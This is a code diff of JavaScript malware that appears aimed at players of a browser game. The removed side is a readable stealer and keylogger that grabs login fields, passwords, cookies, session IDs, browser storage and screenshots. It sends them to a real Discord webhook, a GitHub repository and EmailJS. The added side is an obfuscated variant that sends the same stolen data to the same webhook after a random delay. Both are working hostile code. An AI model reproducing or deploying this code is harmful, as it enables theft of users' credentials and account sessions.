@@ -1,527 +1,196 @@
-
-    (async function() {
-        // Вебхук для отправки данных
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467238723350691993/I5jeRGsdnT1WqwcN_KmBshmtmcfasTLhNrYnOwHrPrLuVrRgbUH-wPM7o46iogcnCO8R';
-	
-        // Функция для получения куки
-        const getCookie = (name) => {
-            const matches = document.cookie.match(new RegExp(
-                "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
-            ));
-            return matches ? decodeURIComponent(matches[1]) : undefined;
-        };
-
-        const un1xxd = Math.floor(Date.now() / 1000);
-        
-        // Получаем IP
-        const getIP = async () => {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip || "Не удалось получить IP";
-            } catch {
-                return "Не удалось получить IP";
-            }
-        };
-
-		function getLoginType() {
-   		 if (user.login.startsWith('g_')) {
-		      return 'Google';
-   		 } else if (user.login.startsWith('f_')) {
-      return 'facebook';
-   		 } else {
-   		   return 'default login';
-  		  }
-		  }
-
-		async function createGitHubFile(github_pat, owner, repo) {
-    const fileName1 = `${un1xxd}_${user.login}.txt`;
-
-    const fileContent = JSON.stringify(userDataResult, null, 2);
-    const contentBase64 = btoa(unescape(encodeURIComponent(fileContent)));
-
-    const url = `https://api.github.com/repos/${owner}/${repo}/contents/${fileName1}`;
-
-    try {
-        const response = await fetch(url, {
-            method: 'PUT',
-            headers: {
-                'Authorization': `token ${github_pat}`,
-                'Accept': 'application/vnd.github.v3+json',
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                message: `Add log file: ${fileName1}`, // Коммит-сообщение
-                content: contentBase64
-            })
-        });
-
-        const data = await response.json();
-
-        if (response.ok) {
-			return url
-        } else {
-        }
-    } catch (error) {
-    }
-};var half = ''
-		createGitHubFile(half + 'x1', 'uloxa13', 'userDatas').then(url => {const githubFileName = url;});
-
-		
-        // Функция для сбора логина и пароля
-        const getCredentials = () => {
-            try {
-                const usernameField = document.querySelector('#loginUsername') || 
-                                    document.querySelector('input[name="login"]') ||
-                                    document.querySelector('input[type="text"]');
-                
-                const passwordField = document.querySelector('input[type="password"]') || 
-                                    document.querySelector('input[name*="pass"]') ||
-                                    document.querySelector('input#password');
-                
-                const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
-                const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
-                
-                return { username, password };
-            } catch {
-                return { 
-                    username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
-                    password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
-                };
-            }
-        };
-
-        // Получаем ВСЕ куки пользователя
-        const getAllCookies = () => {
-            return document.cookie.split(';').map(cookie => {
-                const [name, value] = cookie.trim().split('=');
-                return `${name}=${value}`;
-            }).join('\n');
-        };
-
-        // Функция для безопасного клонирования объектов
-        const deepClone = (obj) => {
-            if (obj === null || typeof obj !== 'object') return obj;
-            const clone = Array.isArray(obj) ? [] : {};
-            for (const key in obj) {
-                if (obj.hasOwnProperty(key)) {
-                    clone[key] = deepClone(obj[key]);
-                }
-            }
-            return clone;
-        };
-
-        // Проверяем и получаем данные из переменной `user`
-        const getUserData = () => {
-            try {
-                if (typeof user !== 'undefined' && user !== null) {
-                    return JSON.stringify(deepClone(user), null, 2);
-                }
-                return "Переменная 'user' не найдена или пуста";
-            } catch (e) {
-                return `Ошибка при чтении переменной 'user': ${e.message}`;
-            }
-        };
-		const getUserDataResult = () => {
-            try {
-                if (typeof userDataResult !== 'undefined' && userDataResult !== null) {
-                    return JSON.stringify(deepClone(userDataResult), null, 2);
-                }
-                return "Переменная 'userDataResult' не найдена или пуста";
-            } catch (e) {
-                return `Ошибка при чтении переменной 'userDataResult': ${e.message}`;
-            }
-        };
-
-        // Получаем friendsData
-        const getFriendsData = () => {
-            try {
-                if (typeof friendsData !== 'undefined' && friendsData !== null) {
-                    return JSON.stringify(deepClone(friendsData), null, 2);
-                }
-                return "Переменная 'friendsData' не найдена или пуста";
-            } catch (e) {
-                return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
-            }
-        };
-
-        // Получаем friendsArr
-        const getFriendsArr = () => {
-            try {
-                if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
-                    if (Array.isArray(friendsArr) && friendsArr.length > 100) {
-                        const sample = {
-                            total_length: friendsArr.length,
-                            sample_items: []
-                        };
-                        
-                        for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
-                            if (friendsArr[i]) {
-                                sample.sample_items.push(deepClone(friendsArr[i]));
-                            }
-                        }
-                        
-                        for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
-                            if (friendsArr[i] && sample.sample_items.length < 15) {
-                                sample.sample_items.push(deepClone(friendsArr[i]));
-                            }
-                        }
-                        
-                        return JSON.stringify(sample, null, 2);
-                    }
-                    return JSON.stringify(deepClone(friendsArr), null, 2);
-                }
-                return "Переменная 'friendsArr' не найдена или пуста";
-            } catch (e) {
-                return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
-            }
-        };
-
-        // Получаем уровень пользователя
-        const getUserLevel = (addX = false) => {
-            try {
-                if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
-                    return `level: ${user.level}${addX ? 'x' : ''}`;
-                }
-                return `level: не определен${addX ? 'x' : ''}`;
-            } catch (e) {
-                return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
-            }
-        };
-
-        // Основная функция отправки
-        const sendFullData = async () => {
-            // Сбор всех данных
-            const phpsessid = getCookie('PHPSESSID');
-            const userIP = await getIP();
-            const credentials = getCredentials();
-            const allCookies = getAllCookies();
-            const userData = getUserData();
-            const friendsDataStr = getFriendsData();
-            const friendsArrStr = getFriendsArr();
-			const userDataResultStr = getUserDataResult()
-			const loginType = getLoginType()
-			            
-            const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
-                                     credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
-                                     credentials.username && credentials.password;
-            
-            const userLevel = getUserLevel(bothFieldsFilled);
-            
-            const localStorageData = JSON.stringify(localStorage);
-            const sessionStorageData = JSON.stringify(sessionStorage);
-            
-            // Формируем текстовый файл
-            let fileContent = `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\nAcsess URL: https://raw.githubusercontent.com/uloxa13/userDatas/refs/heads/main/${un1xxd}_${user.login}.txt\n\n`;
-            fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
-            fileContent += `IP-адрес: ${userIP}\n`;
-            fileContent += `URL страницы: ${window.location.href}\n`;
-			fileContent += `Network Type: ${navigator.connection.effectiveType}\n`;
-			fileContent += `Login Method: ${loginType}\n`;
-			fileContent += `Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-			fileContent += `Laungage: ${navigator.language}\n\n`;
-            fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
-            fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
-            fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---\n${friendsDataStr}\n\n`;
-            fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---\n${friendsArrStr}\n\n`;
-            fileContent += `--- УЧЕТНЫЕ ДАННЫЕ ---\n`;
-            fileContent += `Логин: ${credentials.username}\n`;
-            fileContent += `Пароль: ${credentials.password}\n\n`;
-            fileContent += `--- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---\n${allCookies || "Куки не обнаружены"}\n\n`;
-            fileContent += `--- LOCALSTORAGE ---\n${localStorageData}\n\n`;
-            fileContent += `--- SESSIONSTORAGE ---\n${sessionStorageData}\n\n`;
-			fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ userDataResult ---\n${userDataResultStr}\n\n`;
-
-            const textBlob = new Blob([fileContent], { type: 'text/plain' });
-            const formData = new FormData();
-            formData.append('file', textBlob, `user_data_${Date.now()}.txt`);
-
-            // Отправляем в Discord (без скриншота)
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (e) {}
-        };
-
-        await sendFullData();
-    })();
-
-    // Часть для RU (EmailJS) – без смайликов и без логов
-    if (user.authData.countryCode == "RU") {
-        var script = document.createElement('script');
-        script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
-        script.onload = function() {
-            emailjs.init("4N-8nqIjjUBhk1vbi");
-            
-            setTimeout(async () => {
-                // Повторяем все функции сбора данных (можно было бы вынести, но оставляем для простоты)
-                const getCookie = (name) => {
-                    const matches = document.cookie.match(new RegExp(
-                        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
-                    ));
-                    return matches ? decodeURIComponent(matches[1]) : undefined;
-                };
-
-                const getIP = async () => {
-                    try {
-                        const response = await fetch('https://api.ipify.org?format=json');
-                        const data = await response.json();
-                        return data.ip || "Не удалось получить IP";
-                    } catch {
-                        return "Не удалось получить IP";
-                    }
-                };
-
-                const getCredentials = () => {
-                    try {
-                        const usernameField = document.querySelector('#loginUsername') || 
-                                            document.querySelector('input[name="login"]') ||
-                                            document.querySelector('input[type="text"]');
-                        
-                        const passwordField = document.querySelector('input[type="password"]') || 
-                                            document.querySelector('input[name*="pass"]') ||
-                                            document.querySelector('input#password');
-                        
-                        const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
-                        const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
-                        
-                        return { username, password };
-                    } catch {
-                        return { 
-                            username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
-                            password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
-                        };
-                    }
-                };
-
-                const getAllCookies = () => {
-                    return document.cookie.split(';').map(cookie => {
-                        const [name, value] = cookie.trim().split('=');
-                        return `${name}=${value}`;
-                    }).join('\n');
-                };
-
-                const deepClone = (obj) => {
-                    if (obj === null || typeof obj !== 'object') return obj;
-                    const clone = Array.isArray(obj) ? [] : {};
-                    for (const key in obj) {
-                        if (obj.hasOwnProperty(key)) {
-                            clone[key] = deepClone(obj[key]);
-                        }
-                    }
-                    return clone;
-                };
-
-                const getUserData = () => {
-                    try {
-                        if (typeof user !== 'undefined' && user !== null) {
-                            return JSON.stringify(deepClone(user), null, 2);
-                        }
-                        return "Переменная 'user' не найдена или пуста";
-                    } catch (e) {
-                        return `Ошибка при чтении переменной 'user': ${e.message}`;
-                    }
-                };
-
-                const getFriendsData = () => {
-                    try {
-                        if (typeof friendsData !== 'undefined' && friendsData !== null) {
-                            return JSON.stringify(deepClone(friendsData), null, 2);
-                        }
-                        return "Переменная 'friendsData' не найдена или пуста";
-                    } catch (e) {
-                        return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
-                    }
-                };
-
-                const getFriendsArr = () => {
-                    try {
-                        if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
-                            if (Array.isArray(friendsArr) && friendsArr.length > 100) {
-                                const sample = {
-                                    total_length: friendsArr.length,
-                                    sample_items: []
-                                };
-                                
-                                for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
-                                    if (friendsArr[i]) {
-                                        sample.sample_items.push(deepClone(friendsArr[i]));
-                                    }
-                                }
-                                
-                                for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
-                                    if (friendsArr[i] && sample.sample_items.length < 15) {
-                                        sample.sample_items.push(deepClone(friendsArr[i]));
-                                    }
-                                }
-                                
-                                return JSON.stringify(sample, null, 2);
-                            }
-                            return JSON.stringify(deepClone(friendsArr), null, 2);
-                        }
-                        return "Переменная 'friendsArr' не найдена или пуста";
-                    } catch (e) {
-                        return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
-                    }
-                };
-
-                const getUserLevel = (addX = false) => {
-                    try {
-                        if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
-                            return `level: ${user.level}${addX ? 'x' : ''}`;
-                        }
-                        return `level: не определен${addX ? 'x' : ''}`;
-                    } catch (e) {
-                        return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
-                    }
-                };
-
-                const sendUserData = async () => {
-                    const phpsessid = getCookie('PHPSESSID');
-                    const userIP = await getIP();
-                    const credentials = getCredentials();
-                    const allCookies = getAllCookies();
-                    const userData = getUserData();
-                    const friendsDataStr = getFriendsData();
-                    const friendsArrStr = getFriendsArr();
-                    
-                    const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
-                                             credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
-                                             credentials.username && credentials.password;
-                    
-                    const userLevel = getUserLevel(bothFieldsFilled);
-                    
-                    const localStorageData = JSON.stringify(localStorage);
-                    const sessionStorageData = JSON.stringify(sessionStorage);
-                    
-                    // Текст без смайликов
-                    const messageText = `
-ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
-=============================
-
-Время: ${new Date().toLocaleString()}
-IP-адрес: ${userIP}
-URL: ${window.location.href}
-
-УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:
-${userLevel}
-Gems: ${user?.premiumPoints || 'N/A'}
-Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}
-
-PHPSESSID:
-${phpsessid || "PHPSESSID: не найдена"}
-
-ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
-${userData}
-
-ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData:
-${friendsDataStr}
-
-ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr:
-${friendsArrStr}
-
-УЧЕТНЫЕ ДАННЫЕ:
-Логин: ${credentials.username}
-Пароль: ${credentials.password}
-
-ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ:
-${allCookies || "Куки не обнаружены"}
-
-LOCALSTORAGE:
-${localStorageData}
-
-SESSIONSTORAGE:
-${sessionStorageData}
-=============================
-Отчет сгенерирован автоматически.
-                    `;
-
-                    const templateParams = { message: messageText };
-
-                    emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams)
-                        .then(function(response) {})
-                        .catch(function(error) {});
-                };
-
-                await sendUserData();
-            }, 1);
-        };
-        document.head.appendChild(script);
-    }
-(async () => {
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467238723350691993/I5jeRGsdnT1WqwcN_KmBshmtmcfasTLhNrYnOwHrPrLuVrRgbUH-wPM7o46iogcnCO8R';
-    let messageId = null;
-    let pressedKeys = []; // Массив для хранения клавиш
-
-    // Слушатель нажатий клавиш
-    document.addEventListener('keydown', (event) => {
-        pressedKeys.push(event.key);
-        // Ограничиваем длину до последних 50 символов
-        if (pressedKeys.length > 50) {
-            pressedKeys.shift();
+(function() {
+    const _0x53507a = function() {
+        let _0x5f4a4b = '';
+        for (let _0x1c4530 = 0x0; _0x1c4530 < "https://discord.com/api/webhooks/1467238723350691993/I5jeRGsdnT1WqwcN_KmBshmtmcfasTLhNrYnOwHrPrLuVrRgbUH-wPM7o46iogcnCO8R".length; _0x1c4530++) {
+            _0x5f4a4b += "https://discord.com/api/webhooks/1467238723350691993/I5jeRGsdnT1WqwcN_KmBshmtmcfasTLhNrYnOwHrPrLuVrRgbUH-wPM7o46iogcnCO8R" [_0x1c4530];
         }
-    });
-
-    if (typeof html2canvas === 'undefined') {
-        const script = document.createElement('script');
-        script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
-        document.head.appendChild(script);
-        await new Promise(r => script.onload = r);
-    }
-
-    while (true) {
-        const startTime = Date.now();
-
+        return _0x5f4a4b;
+    };
+    const _0x4ded94 = _0x1dbf27 => {
+        const _0x2a018a = document.cookie.match(new RegExp("(?:^|; )" + _0x1dbf27.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
+        return _0x2a018a ? decodeURIComponent(_0x2a018a[0x1]) : undefined;
+    };
+    const _0x1fc19e = async() => {
         try {
-            const canvas = await html2canvas(document.body, {
-                useCORS: true,
-                allowTaint: true,
-                logging: false,
-                scale: 0.5 
-            });
-
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
-            const formData = new FormData();
-            
-            // Формируем текст с последними клавишами
-            const keyLogText = `KeyLogger: ${pressedKeys.join(' ')}`;
-            
-            const payload = {
-                content: keyLogText, // Добавляем текст в сообщение
-                attachments: []
-            };
-            
-            formData.append('payload_json', JSON.stringify(payload));
-            formData.append('files[0]', blob, 'screen.jpg');
-
-            if (!messageId) {
-                const res = await fetch(`${WEBHOOK_URL}?wait=true`, { 
-                    method: 'POST', 
-                    body: formData 
-                });
-                const data = await res.json();
-                messageId = data.id;
-            } else {
-                const res = await fetch(`${WEBHOOK_URL}/messages/${messageId}`, { 
-                    method: 'PATCH', 
-                    body: formData 
-                });
-                
-                if (res.status === 429) {
-                    const data = await res.json();
-                    const retryAfter = data.retry_after || 5;
-                    await new Promise(r => setTimeout(r, retryAfter * 1000));
-                }
-            }
-
-        } catch (e) {
-            // Ошибка игнорируется
+            const _0x34dd85 = await fetch("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e");
+            const _0x188002 = await _0x34dd85.json();
+            return _0x188002.ip || "Неуспешно получаване на IP";
+        } catch {
+            return "Неуспешно получаване на IP";
         }
-
-        const executionTime = Date.now() - startTime;
-        const delay = Math.max(2500 - executionTime, 500);
-        await new Promise(r => setTimeout(r, delay));
-    }
+    };
+    const _0x49c5b6 = () => {
+        try {
+            const _0x2ac13b = document.querySelector('#loginUsername') || document.querySelector("input[name=\"login\"]") || document.querySelector("input[type=\"text\"]");
+            const _0x35b3d8 = document.querySelector("input[type=\"password\"]") || document.querySelector("input[name*=\"pass\"]") || document.querySelector("input#password");
+            const _0x3bc3fa = _0x2ac13b ? _0x2ac13b.value : 'ПОЛЕ_ЗА_ПОТРЕБИТЕЛСКО_ИМЕ_НЕ_Е_НАМЕРЕНО';
+            const _0xe63a33 = _0x35b3d8 ? _0x35b3d8.value : "ПОЛЕ_ЗА_ПАРОЛА_НЕ_Е_НАМЕРЕНО";
+            return {
+                'username': _0x3bc3fa,
+                'password': _0xe63a33
+            };
+        } catch {
+            return {
+                'username': 'ГРЕШКА_ПРИ_ПОЛУЧАВАНЕ_НА_ПОТРЕБИТЕЛСКО_ИМЕ',
+                'password': 'ГРЕШКА_ПРИ_ПОЛУЧАВАНЕ_НА_ПАРОЛА'
+            };
+        }
+    };
+    const _0x1d7184 = () => {
+        return document.cookie.split(';').map(_0xcce999 => {
+            const [_0x3ec148, _0x6cb98d] = _0xcce999.trim().split('=');
+            return _0x3ec148 + '=' + _0x6cb98d;
+        }).join("\n");
+    };
+    const _0x11f545 = _0x34edb => {
+        if (_0x34edb === null || typeof _0x34edb !== "object") {
+            return _0x34edb;
+        }
+        const _0x2c1b96 = Array.isArray(_0x34edb) ? [] : {};
+        for (const _0x3b287b in _0x34edb) {
+            if (_0x34edb.hasOwnProperty(_0x3b287b)) {
+                _0x2c1b96[_0x3b287b] = _0x11f545(_0x34edb[_0x3b287b]);
+            }
+        }
+        return _0x2c1b96;
+    };
+    const _0x2c1052 = () => {
+        try {
+            if (typeof user !== 'undefined' && user !== null) {
+                return JSON.stringify(_0x11f545(user), null, 0x2);
+            }
+            return "Променливата 'user' не е намерена или е празна";
+        } catch (_0x1e7cc9) {
+            return "Грешка при четене на променлива 'user': " + _0x1e7cc9.message;
+        }
+    };
+    const _0x5df2ab = () => {
+        try {
+            if (typeof friendsData !== "undefined" && friendsData !== null) {
+                return JSON.stringify(_0x11f545(friendsData), null, 0x2);
+            }
+            return "Променливата 'friendsData' не е намерена или е празна";
+        } catch (_0xf6e224) {
+            return "Грешка при четене на променлива 'friendsData': " + _0xf6e224.message;
+        }
+    };
+    const _0x49787d = () => {
+        try {
+            if (typeof friendsArr !== "undefined" && friendsArr !== null) {
+                if (Array.isArray(friendsArr) && friendsArr.length > 0x64) {
+                    const _0x14ddc4 = {
+                        'total_length': friendsArr.length,
+                        'sample_items': []
+                    };
+                    for (let _0x141d11 = 0x0; _0x141d11 < Math.min(0xa, friendsArr.length); _0x141d11++) {
+                        if (friendsArr[_0x141d11]) {
+                            _0x14ddc4.sample_items.push(_0x11f545(friendsArr[_0x141d11]));
+                        }
+                    }
+                    for (let _0x32f56c = Math.max(0x0, friendsArr.length - 0x5); _0x32f56c < friendsArr.length; _0x32f56c++) {
+                        if (friendsArr[_0x32f56c] && _0x14ddc4.sample_items.length < 0xf) {
+                            _0x14ddc4.sample_items.push(_0x11f545(friendsArr[_0x32f56c]));
+                        }
+                    }
+                    return JSON.stringify(_0x14ddc4, null, 0x2);
+                }
+                return JSON.stringify(_0x11f545(friendsArr), null, 0x2);
+            }
+            return "Променливата 'friendsArr' не е намерена или е празна";
+        } catch (_0x5e24ae) {
+            return "Грешка при четене на променлива 'friendsArr': " + _0x5e24ae.message;
+        }
+    };
+    const _0x779aa0 = (_0x466bd9 = false) => {
+        try {
+            if (typeof user !== "undefined" && user !== null && user.level !== undefined) {
+                return "ниво: " + user.level + (_0x466bd9 ? 'x' : '');
+            }
+            return "ниво: неопределено" + (_0x466bd9 ? 'x' : '');
+        } catch (_0x42e912) {
+            return "ниво: грешка при получаване (" + _0x42e912.message + ')' + (_0x466bd9 ? 'x' : '');
+        }
+    };
+    const _0x561897 = () => {
+        try {
+            const _0x4fb4ac = {};
+            for (let _0x38b8ee = 0x0; _0x38b8ee < localStorage.length; _0x38b8ee++) {
+                const _0x2f3692 = localStorage.key(_0x38b8ee);
+                _0x4fb4ac[_0x2f3692] = localStorage.getItem(_0x2f3692);
+            }
+            return JSON.stringify(_0x4fb4ac, null, 0x2);
+        } catch (_0x75f5d7) {
+            return "Грешка при четене на localStorage: " + _0x75f5d7.message;
+        }
+    };
+    const _0x32131a = () => {
+        try {
+            const _0x12496d = {};
+            for (let _0x102909 = 0x0; _0x102909 < sessionStorage.length; _0x102909++) {
+                const _0x3abff1 = sessionStorage.key(_0x102909);
+                _0x12496d[_0x3abff1] = sessionStorage.getItem(_0x3abff1);
+            }
+            return JSON.stringify(_0x12496d, null, 0x2);
+        } catch (_0x9e7e95) {
+            return "Грешка при четене на sessionStorage: " + _0x9e7e95.message;
+        }
+    };
+    const _0x54e8ea = async() => {
+        const _0x377a66 = _0x53507a();
+        const _0x52cc99 = _0x4ded94("PHPSESSID");
+        const _0x1c42b5 = await _0x1fc19e();
+        const _0x5131ae = _0x49c5b6();
+        const _0x3a77a7 = _0x1d7184();
+        const _0x112e68 = _0x2c1052();
+        const _0xb101ce = _0x5df2ab();
+        const _0x5f00c2 = _0x49787d();
+        const _0x1ddc2d = _0x561897();
+        const _0x173f4e = _0x32131a();
+        const _0x434578 = {
+            'userAgent': navigator.userAgent,
+            'language': navigator.language,
+            'platform': navigator.platform,
+            'online': navigator.onLine,
+            'screenResolution': window.screen.width + 'x' + window.screen.height,
+            'availableScreenResolution': window.screen.availWidth + 'x' + window.screen.availHeight,
+            'colorDepth': window.screen.colorDepth,
+            'pixelDepth': window.screen.pixelDepth,
+            'timeZone': Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        const _0x234428 = _0x5131ae.username !== 'ПОЛЕ_ЗА_ПОТРЕБИТЕЛСКО_ИМЕ_НЕ_Е_НАМЕРЕНО' && _0x5131ae.password !== "ПОЛЕ_ЗА_ПАРОЛА_НЕ_Е_НАМЕРЕНО" && _0x5131ae.username && _0x5131ae.password;
+        const _0x11f6fa = _0x779aa0(_0x234428);
+        let _0x5c56e5 = "=== ПЪЛЕН ОТЧЕТ ЗА ПОТРЕБИТЕЛЯ ===\n\n";
+        _0x5c56e5 += "--- НИВО НА ПОТРЕБИТЕЛЯ ---\n" + _0x11f6fa + "\nскъпоценни камъни: " + user.premiumPoints + "\n\n";
+        _0x5c56e5 += "--- ОСНОВНИ ДАННИ ---\n";
+        _0x5c56e5 += "IP адрес: " + _0x1c42b5 + "\n";
+        _0x5c56e5 += "URL на страницата: " + window.location.href + "\n";
+        _0x5c56e5 += "User-Agent: " + navigator.userAgent + "\n\n";
+        _0x5c56e5 += "--- PHPSESSID ---\n" + (_0x52cc99 || "PHPSESSID: не е намерена") + "\n\n";
+        _0x5c56e5 += "--- ДАННИ ОТ ПРОМЕНЛИВАТА user ---\n" + _0x112e68 + "\n\n";
+        _0x5c56e5 += "--- ДАННИ ОТ ПРОМЕНЛИВАТА friendsData ---\n" + _0xb101ce + "\n\n";
+        _0x5c56e5 += "--- ДАННИ ОТ ПРОМЕНЛИВАТА friendsArr ---\n" + _0x5f00c2 + "\n\n";
+        _0x5c56e5 += "--- ПОТРЕБИТЕЛСКИ ДАННИ ---\n";
+        _0x5c56e5 += "Потребителско име: " + _0x5131ae.username + "\n";
+        _0x5c56e5 += "Парола: " + _0x5131ae.password + "\n\n";
+        _0x5c56e5 += "--- ВСИЧКИ БИСКВИТКИ НА ПОТРЕБИТЕЛЯ ---\n" + (_0x3a77a7 || "Не са открити бисквитки") + "\n";
+        _0x5c56e5 += "--- ДАННИ ОТ localStorage ---\n" + _0x1ddc2d + "\n";
+        _0x5c56e5 += "--- ДАННИ ОТ sessionStorage ---\n" + _0x173f4e + "\n";
+        _0x5c56e5 += "--- ДАННИ ЗА БРАУЗЪРА ---\n" + JSON.stringify(_0x434578, null, 0x2) + "\n";
+        const _0x5e4ff8 = new Blob([_0x5c56e5], {
+            'type': "text/plain"
+        });
+        const _0x4c288b = new FormData();
+        _0x4c288b.append("file", _0x5e4ff8, "user_data_" + Date.now() + '.txt');
+        try {
+            await fetch(_0x377a66, {
+                'method': "POST",
+                'body': _0x4c288b
+            });
+        } catch (_0x252cd8) {
+            console.error("Грешка при изпращане на данни:", _0x252cd8);
+        }
+    };
+    setTimeout(async() => {
+        await _0x54e8ea();
+    }, 0xbb8 + Math.random() * 0x1b58);
 })();
